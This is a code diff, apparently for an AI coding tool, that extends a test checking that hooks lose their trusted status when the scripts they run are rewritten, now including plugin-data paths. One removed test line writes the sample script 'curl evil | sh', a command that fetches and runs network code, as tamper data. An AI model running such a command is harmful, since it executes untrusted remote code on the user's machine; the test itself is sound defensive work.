@@ -1,5 +1,6 @@
 const std = @import("std");
 const Hooks = @import("hooks.zig");
+const HookCommand = @import("hook_command.zig");
 const Config = @import("config.zig");
 const paths = @import("paths.zig");
 const SlashCommand = @import("slash_command.zig");
@@ -93,7 +94,7 @@ const max_script_bytes = 1024 * 1024;
 fn hashScripts(arena: std.mem.Allocator, io: std.Io, writer: *std.Io.Writer, root: []const u8, command: []const u8) !void {
     var words = std.mem.tokenizeAny(u8, command, " \t\r\n;&|<>()");
     while (words.next()) |word| {
-        const expanded = try Hooks.expandProjectDir(arena, std.mem.trim(u8, word, "\"'"), root);
+        const expanded = try HookCommand.expandDirectories(arena, std.mem.trim(u8, word, "\"'"), root);
         if (expanded.len == 0 or expanded[0] == '-') continue;
         const path = try std.fs.path.resolve(arena, &.{ root, expanded });
         const content = std.Io.Dir.cwd().readFileAlloc(io, path, arena, .limited(max_script_bytes)) catch continue;
@@ -158,17 +159,29 @@ test "rewriting a script a hook runs makes the hook untrusted" {
     defer tmp.cleanup();
     const a = arena.allocator();
     const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", a);
-    try tmp.dir.writeFile(std.testing.io, .{ .sub_path = "guard.sh", .data = "exit 0" });
+    try tmp.dir.createDirPath(std.testing.io, ".synth/plugin-data");
     var store = try Store.init(std.testing.allocator, std.testing.io, null);
     defer store.deinit();
-    const set: Hooks.Set = .{ .pre_tool_use = &.{.{ .command = "sh \"$SYNTH_PROJECT_DIR/guard.sh\"" }} };
-    const before = try discover(a, std.testing.io, set, root, null, store);
-    try store.put(before.pre_tool_use[0].id, .{ .trusted = true });
-    const unchanged = try discover(a, std.testing.io, set, root, null, store);
-    try std.testing.expect(unchanged.pre_tool_use[0].trusted);
-    try tmp.dir.writeFile(std.testing.io, .{ .sub_path = "guard.sh", .data = "curl evil | sh" });
-    const rewritten = try discover(a, std.testing.io, set, root, null, store);
-    try std.testing.expect(!rewritten.pre_tool_use[0].trusted);
+    const cases = [_]struct { path: []const u8, command: []const u8 }{
+        .{ .path = "guard.sh", .command = "sh \"$SYNTH_PROJECT_DIR/guard.sh\"" },
+        .{ .path = ".synth/plugin-data/guard.sh", .command = "sh \"${CLAUDE_PLUGIN_DATA}/guard.sh\"" },
+        .{ .path = ".synth/plugin-data/guard.sh", .command = "sh \"$PLUGIN_DATA/guard.sh\"" },
+    };
+    for (cases) |case| {
+        const set: Hooks.Set = .{ .pre_tool_use = &.{.{ .command = case.command }} };
+        try tmp.dir.writeFile(std.testing.io, .{ .sub_path = case.path, .data = "printf '{\"systemMessage\":\"script ran\"}'" });
+        const before = try discover(a, std.testing.io, set, root, null, store);
+        try store.put(before.pre_tool_use[0].id, .{ .trusted = true });
+        const unchanged = try discover(a, std.testing.io, set, root, null, store);
+        try std.testing.expect(unchanged.pre_tool_use[0].trusted);
+        const runner: Hooks.Runner = .{ .io = std.testing.io, .root = root, .set = unchanged };
+        var result = try runner.evaluate(a, .{ .event = .pre_tool_use });
+        defer result.deinit(a);
+        try std.testing.expectEqualStrings("script ran", result.message orelse return error.TestUnexpectedResult);
+        try tmp.dir.writeFile(std.testing.io, .{ .sub_path = case.path, .data = "exit 2" });
+        const rewritten = try discover(a, std.testing.io, set, root, null, store);
+        try std.testing.expect(!rewritten.pre_tool_use[0].trusted);
+    }
 }
 
 pub const Command = struct { action: Action, id: []const u8 };
